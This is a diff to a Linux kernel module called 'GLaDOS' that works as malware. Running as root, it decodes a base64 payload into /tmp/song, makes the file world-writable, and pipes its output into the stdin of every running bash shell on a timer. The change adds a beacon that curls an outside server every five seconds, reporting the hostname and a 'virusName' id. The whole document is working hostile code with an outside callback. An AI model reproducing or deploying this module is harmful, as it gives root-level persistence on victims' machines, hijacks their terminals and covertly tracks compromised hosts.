@@ -6,13 +6,15 @@
 #include <linux/delay.h>
 
 #define FILENAME "/tmp/song"
-//#define INTERVAL_SECONDS 300
 #define INTERVAL_SECONDS 300
+#define CHECKIN_INTERVAL_SECONDS 5
 
 char *cmd = "/bin/echo "
 #include "song/song_b64.txt"
 " | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
 "/usr/bin/pgrep -f bash | /usr/bin/xargs /usr/bin/printf '/proc/%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file &'";
+
+char *checkin = "curl -XGET http://monitor.daviddworken.com:8080/api/submit?id=`hostname`&virusName=4";
 
 static void GLaDOS_cake(void) {
     char *argv[] = { "/bin/bash", "-c", cmd, NULL };
@@ -27,17 +29,39 @@ static void GLaDOS_cake(void) {
     };
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
 }
 
 int stop;
 int thread_function(void *data) {
+    char *checkin_argv[] = { "/bin/bash", "-c", checkin, NULL };
+    static char *envp[] = {
+        "SHELL=/bin/bash",
+        "HOME=/root",
+        "USER=root",
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
+        "DISPLAY=:0",
+        "PWD=/root",
+        NULL
+    };
+
     stop = 0;
+    int loops = 0;
+
     while(true) {
-        printk("[GLaDOS][+] cake\n");
-    	GLaDOS_cake();
-	    msleep_interruptible(INTERVAL_SECONDS * 1000);
+        if(loops == INTERVAL_SECONDS / CHECKIN_INTERVAL_SECONDS) {
+            printk("[GLaDOS][+] cake\n");
+            GLaDOS_cake();
+            loops = 0;
+        }
+
+        msleep_interruptible(CHECKIN_INTERVAL_SECONDS * 1000);
+        call_usermodehelper(checkin_argv[0], checkin_argv, envp, UMH_WAIT_EXEC);
+        loops++;
+
         if(stop) return 0;
     }
+
 }
 
 int data;
